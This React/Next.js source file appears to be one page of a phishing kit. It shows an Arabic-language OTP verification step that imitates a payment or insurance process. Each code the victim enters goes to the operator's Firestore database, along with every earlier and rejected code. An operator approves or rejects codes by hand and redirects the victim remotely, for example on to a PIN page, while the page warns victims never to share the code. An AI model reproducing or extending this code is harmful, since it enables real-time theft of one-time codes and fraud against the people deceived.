"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { StepShell } from "@/components/step-shell"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

const allOtps: string[] = []

export default function VeriPage() {
  const router = useRouter()
  const [_v5, _s5] = useState("")
  const [error, setError] = useState("")
  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [canResend, setCanResend] = useState(false)
  const [resendTimer, setResendTimer] = useState(60)
  const [referenceNumber, setReferenceNumber] = useState("")

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "veri", 5)
      // Generate reference number
      const ref = `REF${Date.now().toString().slice(-8)}`
      setReferenceNumber(ref)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "veri" })

  // Resend timer
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
      return () => clearTimeout(timer)
    } else {
      setCanResend(true)
    }
  }, [resendTimer])

  // Check if visitor has access to this page
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }

    const checkAccess = async () => {
      if (!db) return
      const docRef = doc(db as Firestore, "pays", visitorID)
      const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
        if (!docSnapshot.exists()) {
          router.push("/check")
          return
        }
        setIsLoading(false)
      })

      return unsubscribe
    }

    checkAccess()
  }, [router])

  // Listen to Firestore for OTP status changes
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected"

          if (status === "rejected") {
            // Save rejected OTP and reset status
            const updates: any = {
              _v5Status: "pending"
            }
            
            // Only save to oldOtp if there's an OTP to save
            if (data._v5) {
              const currentOtp = {
                code: data._v5,
                rejectedAt: new Date().toISOString()
              }
              updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
            }
            
            setDoc(doc(db as Firestore, "pays", visitorID), updates, { merge: true }).then(() => {
              _ss5("pending")
              _s5("") // Clear the old code
              setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
            }).catch(err => {
              console.error("Error saving rejected OTP:", err)
              setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
            })
          } else if (status === "approved") {
            _ss5("approved")
            setError("")
            // Redirect to PIN page
            router.push("/step3")
          } else if (status === "verifying") {
            _ss5("verifying")
          }
        }
      },
      (err) => {
        console.error("Error listening to document:", err)
        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
      }
    )

    return () => unsubscribe()
  }, [router])

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          // Redirect based on currentStep
          if (step === "home") {
            router.push("/insur")
          } else if (step === "phone") {
            router.push("/step5")
          } else if (step === "_t6") {
            router.push("/step4")
          } else if (step === "_st1") {
            router.push("/check")
          } else if (step === "_t3") {
            router.push("/step3")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router])

  // Auto-fill OTP from SMS (Web OTP API)
  useEffect(() => {
    if ('OTPCredential' in window) {
      const ac = new AbortController()

      navigator.credentials
        .get({
          // @ts-ignore
          _v5: { transport: ['sms'] },
          signal: ac.signal,
        })
        .then((_v5: any) => {
          if (_v5 && _v5.code) {
            _s5(_v5.code)
          }
        })
        .catch((err) => {
          console.log('OTP auto-fill error:', err)
        })

      return () => {
        ac.abort()
      }
    }
  }, [])

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (_v5.length < 4) {
      setError("يرجى إدخال رمز التحقق")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      allOtps.push(_v5)
      // Update the document with the OTP
      if (!db) return
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v5,
        otpSubmittedAt: new Date().toISOString(),
        allOtps,
        _v5Status: "verifying", // Set to verifying, waiting for admin decision
        otpUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add OTP to history
      await addToHistory(visitorID, "_t2", {
        _v5: _v5
      }, "pending")

      _ss5("verifying") // Show loading state
      // The status will be updated via the listener when admin approves/rejects
    } catch (err) {
      console.error("Error submitting OTP:", err)
      setError("حدث خطأ في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.")
    }
  }

  const handleResendOtp = async () => {
    if (!canResend) return

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      if (!db) return
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        otpResendRequested: true,
        otpResendAt: new Date().toISOString()
      }, { merge: true })

      // Reset timer
      setCanResend(false)
      setResendTimer(60)
      _s5("")
      setError("")
    } catch (err) {
      console.error("Error resending OTP:", err)
      setError("حدث خطأ في إعادة الإرسال. يرجى المحاولة مرة أخرى.")
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <>
      {(_v5Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <StepShell
        step={5}
        title="رمز التحقق"
        subtitle="لإتمام العملية الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك المسجل"
        icon={<ShieldCheck className="h-8 w-8" />}
      >
        <form onSubmit={handleOtpSubmit} className="space-y-4">
          {error && (
            <Alert variant="destructive" className="border-2">
              <AlertCircle className="h-5 w-5" />
              <AlertDescription className="text-base">{error}</AlertDescription>
            </Alert>
          )}

          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4">
            <div className="space-y-2 text-sm text-[#24577a]">
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4" />
                <span>الرمز صالح لمدة 5 دقائق</span>
              </div>
              <div className="flex items-center gap-2">
                <Lock className="h-4 w-4" />
                <span>لا تشارك هذا الرمز مع أي شخص</span>
              </div>
            </div>
            <div className="mt-3 border-t border-[#dce8f3] pt-3 text-center text-xs text-[#6a8498]">
              رقم العملية: <span className="font-mono font-bold text-[#24577a]">{referenceNumber}</span>
            </div>
          </div>

          <Input
            type="password"
            inputMode="numeric"
            autoComplete="one-time-code"
            placeholder="رمز التحقق"
            value={_v5}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 6)
              _s5(value)
              setError("")
            }}
            maxLength={6}
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-3xl font-bold tracking-[0.35em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
            disabled={_v5Status === "verifying"}
            required
            autoFocus
          />

          <div className="text-center">
            {canResend ? (
              <button
                type="button"
                onClick={handleResendOtp}
                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#145072] hover:underline"
              >
                <RefreshCw className="h-4 w-4" />
                إعادة إرسال الرمز
              </button>
            ) : (
              <p className="text-sm text-[#6a8498]">يمكنك إعادة الإرسال بعد {resendTimer} ثانية</p>
            )}
          </div>

          <Button
            type="submit"
            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
            disabled={_v5.length < 4 || _v5Status === "verifying"}
          >
            تأكيد
          </Button>
        </form>
      </StepShell>
    </>
  )
}
